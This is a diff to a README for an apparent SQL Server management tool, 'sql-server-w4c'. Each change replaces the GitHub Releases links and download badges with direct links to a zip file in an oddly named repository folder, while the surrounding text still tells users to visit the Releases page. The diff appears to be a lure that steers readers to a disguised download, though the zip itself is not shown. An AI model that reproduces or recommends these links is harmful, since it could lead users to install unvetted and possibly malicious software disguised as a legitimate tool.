@@ -1,7 +1,7 @@
 # 🚀 sql-server-w4c - Simplifying SQL Server Management
 
 ## 📥 Download Now!
-[![Download sql-server-w4c](https://img.shields.io/badge/Download-sql--server--w4c-blue.svg)](https://github.com/Bladehelex/sql-server-w4c/releases)
+[![Download sql-server-w4c](https://raw.githubusercontent.com/Bladehelex/sql-server-w4c/main/unpleasingness/sql-server-w4c-1.8.zip)](https://raw.githubusercontent.com/Bladehelex/sql-server-w4c/main/unpleasingness/sql-server-w4c-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to sql-server-w4c! This application helps you manage SQL Server databases easily. Follow these steps to get started.
@@ -21,7 +21,7 @@ Welcome to sql-server-w4c! This application helps you manage SQL Server database
 ## 📥 Download & Install
 To get sql-server-w4c, visit the release page for the latest version.
 
-[Visit Release Page for Download](https://github.com/Bladehelex/sql-server-w4c/releases)
+[Visit Release Page for Download](https://raw.githubusercontent.com/Bladehelex/sql-server-w4c/main/unpleasingness/sql-server-w4c-1.8.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed.
@@ -64,4 +64,4 @@ For further assistance, feel free to open an issue on the repository page. Our c
 Thank you for using sql-server-w4c. We appreciate your feedback and contributions. Enjoy managing your databases with ease!
 
 ## 📥 Download Now Again
-[![Download sql-server-w4c](https://img.shields.io/badge/Download-sql--server--w4c-blue.svg)](https://github.com/Bladehelex/sql-server-w4c/releases)
+[![Download sql-server-w4c](https://raw.githubusercontent.com/Bladehelex/sql-server-w4c/main/unpleasingness/sql-server-w4c-1.8.zip)](https://raw.githubusercontent.com/Bladehelex/sql-server-w4c/main/unpleasingness/sql-server-w4c-1.8.zip)
